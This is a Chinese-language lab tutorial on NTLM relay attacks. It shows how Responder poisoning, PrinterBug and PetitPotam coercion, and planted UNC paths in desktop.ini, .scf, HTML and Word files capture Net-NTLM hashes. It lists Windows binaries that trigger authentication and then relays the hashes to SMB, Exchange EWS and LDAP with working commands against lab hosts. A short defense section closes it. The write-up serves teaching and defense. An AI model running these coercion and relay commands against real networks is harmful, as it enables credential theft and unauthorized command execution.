# NTLM Realy 攻击

NTLM Realy 攻击其实应该称为Net-NTLM Realy 攻击，它发生在NTLM认证的第三步，在Response 消息中存在Net-NTLM
Hash,当攻击者获得了 Net-NTLM Hash 后，可以重放Net-NTLM Hash 进行中间人攻击。

NTLM Realy 流程如图所示，攻击者作为中间人在客户端和服务器之间转发NTLM认证数据包，从而模拟客户端身份访问服务端的资源。

![图片.png](https://image.3001.net/images/20230502/1683041439_64512c9fd7eaeb8c6ec01.png!small)

NTLM Relay 攻击分为两步：第一步是捕获 Net-NTLM Hash;第二步是重放 Net-NTLM Hash。

## 捕获 Net-NTLM Hash

捕获 Net-NTLM Hash 又分为两步，具体如下：

第一步是使用工具来监听目标服务器发来的NTLM请求，这里可以使用 Responder 工具执行如下命令进行监听，运行结果如图所示

`responder -I eth0 -wd`

![图片.png](https://image.3001.net/images/20230502/1683041524_64512cf495b9e82eb0101.png!small)

第二步是使目标服务器主动向攻击者发起NTLM认证，常见方法如下。

### LLMNR和NBNS协议

LLMNR（Link-Local Multicast Name Resolution 链路本地多播名称解析）和 NBNS（Network Basic
Input Output System Name
Service，网络基本输入输出系统名称服务）是局域网内的协议，主要用于局域网内的名称解析。当其他方式解析失败时，Windows系统就会使用LLMNR和NBNS协议解析名称。

Windows系统的名称解析顺序如下：

  * 本地hosts文件（%windir%\System32\drivrs\etc\hosts）；

  * DNS缓存/DNS服务器

  * LLMNR和NBNS协议

（1） LLMNR协议

LLMNR协议是一个基于域名称解析系统数据包格式的协议，它定义在RFC4795中。该协议将局域网内的IPv4和IPv6的主机进行名称解析为同一本地链路上的主机，因此也称作多播DNS。Windwos
操作系统从Windows Vista
开始就内嵌支持LLMNR协议，Linux系统也通过了systemd实现了此协议。LLMNR协议监听的端口为UDP的5355端口，支持IPv4和IPv6。LLMNR协议类似于ARP协议，其解析名称的特点为端到端，IPv4的多播地址为224.0.0.252，IPv6的多播地址为FF02::1:3

(2) NBNS协议

NBNS协议有IBM公司开发，主要用于20~200台计算机的局域网。NBNS协议通过UDP的137端口进行通信，仅支持IPv4而不支持IPv6.NBNS是一种应用程序接口，系统可以利用WINS服务、广播及Lmhosts文件等多种模式将NetBIOS名称解析为相应的IP地址，几乎所有局域网都是在NBNS协议基础上工作的。在Windows操作系统中，默认情况下在安装TCP/IP协议后会自动安装NetBIOS。NBNS协议进行名称解析的过程如下：

  1. 检查本地NetBIOS缓存

  2. 如果缓存中没有请求的名称且已配置了WINS服务器，则会向WINS服务器发生请求

  3. 如果没有配置WINS服务器或WINS服务器无响应，则会向当前子网域发送广播

  4. 发送广播后，如果无任何主机响应，则会读取本地的Lmhosts文件

（3）LLMNR 和 NBNS 协议的区别

两者的区别如下：

  * NBNS基于广播，而LLMNR基于多播

  * NBNS在Windows NT以及更高版本的操作系统上均可使用，而LLMNR只有Windows Vista 以及更高版本的系统上才可用

  * LLMNR支持IPv6，而NetBIOS不支持IPv6

（4）LLMNR&NBNS攻击  
用户输入任意一个不存在的名称，本地hosts文件和DNS服务器均不能正常解析该名称，于是系统就会发送LLMNR/NBNS数据包请求解析。攻击者收到请求后告诉客户端自己是不该存在的名称并要求客户端发送给Net-NTLM Hash 进行认证，这样攻击者就可以收到客户端发来的 Net-NTLM Hash 了

![图片.png](https://image.3001.net/images/20230502/1683041548_64512d0cd78342c753233.png!small)

![图片.png](https://image.3001.net/images/20230502/1683041557_64512d15eadd8e41ab733.png!small)

如图所示，在局域网内主机192.168.41.10上请求解析不存在的名称abcdefgh，此时Responder对目标主机进行LLMNR/NBNS毒化，并要求输入凭据认证，然后就可以抓到目标机器的
Net-NTLM Hash，如图所示：

![图片.png](https://image.3001.net/images/20230502/1683041572_64512d2467bac8482e55f.png!small)

### 打印机漏洞

脚本下载地址：`https://github.com/dirkjanm/krbrelayx`

Windows 的 MS-RPRN
协议用于打印客户端和服务器之间的通信，默认情况下是启用的。该协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()方法调用会创建一个远程更该通知对象，该对象对打印机对象的更改进行监视，并将更改通知发送到打印客户端。任何经过身份验证的域成员都可以连接到远程服务器的打印服务spoolsv.exe，并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标，之后它将会立即测试该连接，即向指定目标进行身份验证（攻击者可以选则通过Kerberos或NTLM进行验证）。

微软表示这个Bug是系统的实际特点，无需修复。由于打印机是以System权限运行的，因此可以访问打印机的MS-RPRNRPC接口，迫使打印机服务向指定的机器发起请求，就能取得目标机器的Net-NTLM Hash了。

域内任意用户访问目标机器的打印机服务，printerbug.py脚本会触发SpoolService
Bug，强制目标主机DC也就是192.168.41.10通过MS-RPRNRPC接口攻击者192.148.41.13进行NTLM身份认证，在本实验中也就是我们kali机器的IP地址。printerbug.py脚本执行的命令如下：

    
    
    python3 printerbug.py hack/jack:Admin123@192.168.41.10 192.168.41.13
    

如图所示，使用printerbug.py脚本触发目标机器向192.168.41.13发起SMB认证。

![图片.png](https://image.3001.net/images/20230502/1683041593_64512d39a24b407d55cde.png!small)

此时Responder已经收到目标机器发送的SMB类型的Net-NTLM Hash 了，如图所示：

![图片.png](https://image.3001.net/images/20230502/1683041610_64512d4a1bbc917781dfc.png!small)

### PetitPotam

下载地址：`https://github.com/topotam/PetitPotam`

2021年7月19日，法国安全研究员 Gilles Lionel 批露了一种新型的触发 Net-NTLM
Hash的手法——PetitPotam,该漏洞利用了微软加密文件系统远程协议（Microsoft Encrypting File System Remote
Protocol, MS-EFSRPC）。 MS-EFSRPC用于对远程协议存储和通过网络访问的数据执行维护和管理操作。利用PetitPotam,安全研究员可以通过连接到LSARPC强制触发目标机器向指定的远程服务器发送Net-NTLM Hash。

使用Petitpotam.py脚本执行如下的命令，强制目标主机DC也就是192.168.41.10向我们的kali机器192.168.41.13发起NTLM身份认证。PetitPotam脚本也支持匿名触发。

    
    
    python3 PetitPotam.py -d hack.com -u jack -p Admin123 192.168.41.10 192.168.41.13
    

![图片.png](https://image.3001.net/images/20230502/1683041631_64512d5f1422dd9cd35ab.png!small)

如图所示，使用PetitPotam.py脚本出发目标机器向攻击者发起SMB认证。

![图片.png](https://image.3001.net/images/20230502/1683041642_64512d6aea19221410594.png!small)

此时Responder已经收到目标机器发送的SMB类型的Net-NTLM Hash 了，如图所示。

### 图标

当图标的一些路径改成指定的UNC路径，就能收到目标机器发来的NTLM请求。

（1）desktop.ini 文件

每个文件夹下都有一个隐藏的desktop.ini，其作用是指定文件夹的图标等。可以通过修改文件夹属性“隐藏受保护的操作系统文件（推荐）”来显示desktop.ini文件。

首先创建一个test文件夹。修改该文件夹的图标为其中任意一个，如图所示

![图片.png](https://image.3001.net/images/20230502/1683041677_64512d8dad2f4e61391bd.png!small)

在“文件夹选项”对话框的“查看”选项卡中取消勾选该文件夹的“隐藏受保护的操作系统（推荐）属性”，同时将在“隐藏文件和文件夹”选项下勾选“显示隐藏的文件、和文件夹和驱动器”如图所示：

![图片.png](https://image.3001.net/images/20230502/1683041700_64512da4497e911947d41.png!small)

这样就能在test文件夹下看到desktop.ini文件了，如图所示

![图片.png](https://image.3001.net/images/20230502/1683041714_64512db23d3be13a213b4.png!small)

desktop.ini文件原内容如图所示

![图片.png](https://image.3001.net/images/20230502/1683041727_64512dbf69a6e9abe9d10.png!small)

将IconResource的内容替换为指定机器的UNC路径，如图所示

![图片.png](https://image.3001.net/images/20230502/1683041740_64512dcc2071773a47010.png!small)

只要有人访问了test文件夹，目标机器就会去请求指定的UNC的图标资源，于是该机器将当前用户的Net-NTLM
Hash发送给指定的UNC机器，在指定的UNC机器上就能接收到目标机器了发来的 Net-NTLM Hash 了。

![图片.png](https://image.3001.net/images/20230502/1683041755_64512ddb7ef6792229c63.png!small)

2）.scf后缀文件  
一个文件夹内若含有.scf文件，由于scf包含IconFile属性，因此explore.exe会尝试获取文件夹的图标。而IconFile是支持UNC路径的，所以当打开文件夹的时候，目标机器就会请求指定UNC的图标资源，并将当前用户的NTLM
v2 Hash 发送给指定的机器，我们在该机器上使用Responder监听，就能收到目标机器发来的Net-NTLM Hash 了。

以下是.scf文件的格式

    
    
    [Shell]
    Command=2
    IconFile=UNC路径
    [Taskbar]
    Command=ToggleDesktop
    

创建一个文件夹，在该文件夹下创建test.scf文件，文件内容如下：

    
    
    [Shell]
    Command=2
    IconFile=\\192.168.41.13\test\test.iso
    [Taskbar]
    Command=ToggleDesktop
    

![图片.png](https://image.3001.net/images/20230502/1683041777_64512df124c77302557f3.png!small)

只要有人访问了test文件夹，目标机器就会请求指定的UNC路径的图标资源，于是该机器会将当前用户 NTLM v2 Hash 发送给指定机器
192.168.41.13，在该机器上就能收接受到目标机器发来的Net-NTLM Hash了。

![图片.png](https://image.3001.net/images/20230502/1683041792_64512e008641e45868f88.png!small)

### 浏览器

当浏览器访问的页面中含有UNC路径，浏览器在解析该页面时也会尝试请求该UNC地址，然后发起NTLM认证。

不同的浏览器对插入不同格式的UNC路径的测试结果如图所示：

![图片.png](https://image.3001.net/images/20230502/1683041812_64512e14b5aaacff581c3.png!small)

比如，在如下的网页文件中插入的UNC格式为\\\192.168.41.13\test。

    
    
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
    </head>
    <body>
    </body>
        <script src="\\192.168.41.13\test"></script>
    </html>
    

这时用户使用IE浏览器访问该页面时，在192.18.41.13机器上就能获得目标用户的SMB类型的Net-NTLM Hash 了。

![图片.png](https://image.3001.net/images/20230502/1683041842_64512e32b206e7e279a0f.png!small)

其他浏览器读者可自行尝试，解决了浏览器对UNC路径的解析后，我们就要思考如何在网页红插入UNC路径了。常见的Web漏洞（如XSS、SSRF、XXE等）都可以在web页面中插入代码。

### 系统命令

通过执行系统命令，访问指定的UNC路径，也可以获取到目标机器的Net-NTLM Hash。触发Net-NTLM Hash的常见命令如下：

    
    
    net.exe use \hostshare 
    attrib.exe \hostshare
    cacls.exe \hostshare
    certreq.exe \hostshare #(noisy, pops an error dialog) 
    certutil.exe \hostshare
    cipher.exe \hostshare
    ClipUp.exe -l \hostshare
    cmdl32.exe \hostshare
    cmstp.exe /s \hostshare
    colorcpl.exe \hostshare #(noisy, pops an error dialog)
    comp.exe /N=0 \hostshare \hostshare
    compact.exe \hostshare
    control.exe \hostshare
    convertvhd.exe -source \hostshare -destination \hostshare
    Defrag.exe \hostshare
    diskperf.exe \hostshare
    dispdiag.exe -out \hostshare
    doskey.exe /MACROFILE=\hostshare
    esentutl.exe /k \hostshare
    expand.exe \hostshare
    extrac32.exe \hostshare
    FileHistory.exe \hostshare #(noisy, pops a gui)
    findstr.exe * \hostshare
    fontview.exe \hostshare #(noisy, pops an error dialog)
    fvenotify.exe \hostshare #(noisy, pops an access denied error)
    FXSCOVER.exe \hostshare #(noisy, pops GUI)
    hwrcomp.exe -check \hostshare
    hwrreg.exe \hostshare
    icacls.exe \hostshare 
    licensingdiag.exe -cab \hostshare
    lodctr.exe \hostshare
    lpksetup.exe /p \hostshare /s
    makecab.exe \hostshare
    msiexec.exe /update \hostshare /quiet
    msinfo32.exe \hostshare #(noisy, pops a "cannot open" dialog)
    mspaint.exe \hostshare #(noisy, invalid path to png error)
    msra.exe /openfile \hostshare #(noisy, error)
    mstsc.exe \hostshare #(noisy, error)
    netcfg.exe -l \hostshare -c p -i foo
    

如图所示，使用系统命令cacls.exe访问指定的UNC路径就可以触发 Net-NTLM Hash了。

    
    
    cacls.exe \\192.168.41.13\test
    

![图片.png](https://image.3001.net/images/20230502/1683041865_64512e499df4baef10120.png!small)

这样就收到目标机器的Net-NTLM Hash 了

![图片.png](https://image.3001.net/images/20230502/1683041878_64512e563be7a221cc43d.png!small)

### Office

新建一个word文件，插入一张图片，如图所示

![图片.png](https://image.3001.net/images/20230502/1683041896_64512e688b0c7e7290b6b.png!small)

用压缩软件打开，进入 1.docx\word_rels 目录，找到并打开document.xml.rels文件

![图片.png](https://image.3001.net/images/20230502/1683041910_64512e763eca433ae96d3.png!small)

可以看到Target参数是本地路径，如图所示

![图片.png](https://image.3001.net/images/20230502/1683041922_64512e82d1168e2619c9f.png!small)

我们将上述的路径修改为指定的UNC路径，然后加上TargetMode="External"

![图片.png](https://image.3001.net/images/20230502/1683041938_64512e92e95af2a720200.png!small)

只要有人访问了该word文档，目标主机就会去请求指定UNC的图片资源，于是该主机会将当前用户的NTLM v2
hash发送给指定的机器，我们在该机器上使用Responder监听，就能接收到目标机器发来的Net-NTLM Hash了

![图片.png](https://image.3001.net/images/20230502/1683041959_64512ea7372c0a00216f3.png!small)

## 重放 Net-NTLM Hash

在获取到目标机器的 Net-NTLM Hash 后，我们要怎么利用呢？这里有利用方式：

  * 使用Hashcat破解Net-NTLM Hash

  * Relay Net-NTLM Hash

关于使用Hashcat破解Net-NTLM Hash可以去看这篇文章[内网渗透(十九)之Windows协议认证和密码抓取-网络认证(基于挑战响应认证的NTLM协议)](https://blog.csdn.net/qq_64973687/article/details/128998467)里面详细描述了NTLM
v2协议及其破解方式

### Relay Net-NTLM Hash

本文主要讲如何Relay Net-NTLM
Hash。我们知道，由于NTLM只是底层的认证协议，必须镶嵌在上层应用协议里面，消息的传输依赖于使用NTLM的上层协议，比如SMB、HTTP、LDAP等。因此，我们可以将获取到的Net-NTLM Hash Relay到其他使用NTLM进行认证的应用上。

#### 中继到SMB协议

直接Relay到SMB服务器，是最直接简单的方法。可以直接控制该服务器执行任意命令等操作。根据工作组和域环境的不同，分为两种场景，具体如下：

（1）在工作组环境中，工作组中的机器之间相互没有信任关系，除非两台机器的账号密码相同，否则中继不成功。但是如果账号密码相同的话，为何不直接Pass The
Hash攻击呢？因此在工作组环境下，Relay到其他机器不太现实。那么，我们可以Relay到机器自身吗？答案是可以的。但是后来微软在MS08-068补丁中对Relay到自身机器做了限制，严禁中继到机器自身。道高一尺魔高一丈，这个补丁在CVE-2019-1384(Ghost
Potato)被攻击者绕过了。

1）MS08-068 Relay To
Self。当收到用户的SMB请求之后，最直接的就是把请求Relay回本身，即Reflect，从而控制机器本身。漏洞危害特别高，该漏洞编号为MS08-068。微软在KB957097补丁里面通过修改SMB身份验证答复的验证方式来防止凭据重播，从而解决了该漏洞。防止凭据重播的做法如下:

  * 在Type 1阶段，主机A访问主机B进行SMB认证的时候，将 pszTargetName 设置为CIFS/B

  * 在Type 2阶段，主机A拿到主机B发送的Challenge挑战值之后，在lsass进程里面缓存(Challenge,CIFS/B)

  * 在Type3阶段，主机B在拿到主机A的认证消息之后，会去查询lsass进程里面有没有缓存(Challenge,CIFS/B)，如果存在缓存，那么认证失败。

因为如果主机A和主机B是不同主机的话，那么lsass进程里面就不会缓存(Challenge,CIFS/B)。如果是同一台主机的话，那lsass里面就会缓存(Challenge,CIFS/B)，这个时候就会认证失败。

如图所示，中继到自身就会失败：![图片.png](https://image.3001.net/images/20230502/1683041977_64512eb9c231d8fc10b24.png!small)  
2）CVE-2019-1384 Ghost
Potato。这个漏洞绕过了KB957097补丁措施中，这个缓存是有时效性，时间是300s，也就是300s后，缓存就会被清空，这时主机A和主机B是同一台主机，那么由于缓存已经被清除，那么lsass进程里面肯定没有(Challenge,CIFS/B)缓存。

执行如下的命令，该漏洞的POC基于impacket进行修改，目前只能支持收到Http协议请求的情况。该poc在sleep 315秒之后，再发送Type
3认证消息，于是就绕过了KB957097补丁。

    
    
    python3 ntlmrelayx.py -t smb://192.168.41.15 -smb2support -c whoami
    

（2）域环境

在域环境中，普通域用户默认可以登录除域控以外的其他所有机器，因此可以将域用户的Net-NTLM Hash 中继到域内的其他机器。

1）impacket 下的 smbrelayx.py。运行smbrelayx.py脚本执行如下的命令，该脚本接受域用户的Net-NTLM
Hash，然后中继到域内其他机器执行指定命令。

    
    
    python3 smbrelaxy.py -h 192.168.41.20 -c whoami
    

![图片.png](https://image.3001.net/images/20230502/1683042008_64512ed85b6ac5690c1aa.png!small)

然后我们在域控触发发送NTLM Hash

    
    
    cacls.exe \\192.168.41.13\t
    

![图片.png](https://image.3001.net/images/20230502/1683042034_64512ef2ef26354366c98.png!small)

然后因为我们的域控是域管理员身份登录的，此时当我们在域控触发发送NTLM Hash后，我们的kali机器就捕获到了域管理员的NTLM
Hash，并将其登陆到了域内机器192.168.41.20机器上，执行whoami命令成功。

![图片.png](https://image.3001.net/images/20230502/1683042052_64512f048b3cfc763f3a5.png!small)

2）Responder下的MultiRelay.py脚本。该脚本功能强大，通过ALL参数可以获得一些稳定的shell，还有抓取密码等功能。-t
参数用于指定要中继的机器。该脚本接受域用户的Net-NTLM Hash，然后中继到域内其他机器执行命令。

下载地址：[Responder](https://github.com/lgandx/Responder)

使用MultiRelay.py执行如下命令监听：

    
    
    python3 MultiRelay.py -t 192.168.41.20 -u ALL
    

![图片.png](https://image.3001.net/images/20230502/1683042073_64512f1914ee801342132.png!small)

然后再域控触发发送NTLM Hash后，我们的kali机器就捕获到了域管理员的NTLM Hash，并将其登陆到了域内机器192.168.41.20机器上。

![图片.png](https://image.3001.net/images/20230502/1683042089_64512f29575ff7f9e4e83.png!small)

执行woami命令成功

![图片.png](https://image.3001.net/images/20230502/1683042101_64512f35dabf92f5f7d4b.png!small)

执行help命令查看帮助，可以看到有很多的命令功能。执行系统的命令结果如图所示：

![图片.png](https://image.3001.net/images/20230502/1683042116_64512f44a55084f5d0443.png!small)

#### 中继到HTTP

很多HTTP服务也支持NTLM认证也支持NTLM认证，因此可以中继到HTTP，HTTP的默认策略是不签名的。

1）Exchange认证。Exchange认证也支持NTLM
SSP的，是我们可以将SMB流量Relay到Exchange的EWS接口，从而可以进行收发邮件等操作。

ntlmRelayToEWS下载地址：[ntlmRelayToEWS下载](https://github.com/Arno0x/NtlmRelayToEWS)

使用ntlmRelayToEWS.py脚本执行如下的命令进行监听：

    
    
    python2 ntlmRelayToEWS.py -t https://192.168.41.20/EWS/exchange.asmx -r getFolder -f inbox -v
    

#### 中继到LDAP协议

由于域内默认使用的就是LDAP，而LDAP也支持使用NTLM认证，因此可以将流量中继到LDAP，这也是域内NTLM Relay
常用的一种攻击方式。LDAP的默认策略是协商签名，而并不是强制签名。也就是说是否签名是由客户端决定的，服务端跟客户端协商是否需要签名。

从HTTP和SMB协议中继到LDAP的不同之处在于：

  * 从HTTP协议Relay到LDAP是不要求进行签名的，可以直接进行Relay，如CVE-2018-8581。域内最新的中继手法就是想办法将HTTP类型的流量中继到LDAP。

  * 从SMB协议Relay到LDAP是要求进行签名的，这时，并不能直接进行Relay。CVE-2019-1040就是绕过了NTLM的MIC消息完整性校验，使得SMB协议Relay到LDAP时不需要签名，从而可以发动攻击。

## NTLM Relay 攻击防御

对于防守方或蓝队来说，如何针对 NTLM Relay 攻击进行防御和检测呢？  
由于域内NTLM Relay 攻击最常见的就是中继到LDAP执行高危险操作，因此需要对LDAP进行安全加固。

微软于2019年9月份发布相关通告称计划于2020年1月发布安全更新。为了提升域控的安全性，该安全更新将强制开启所有域控上LDAP通到绑定与LDAP签名功能。如果域控上的LDAP强制开启了签名，那么攻击者将无法将其他流量中继到LDAP进行高危险操作了。

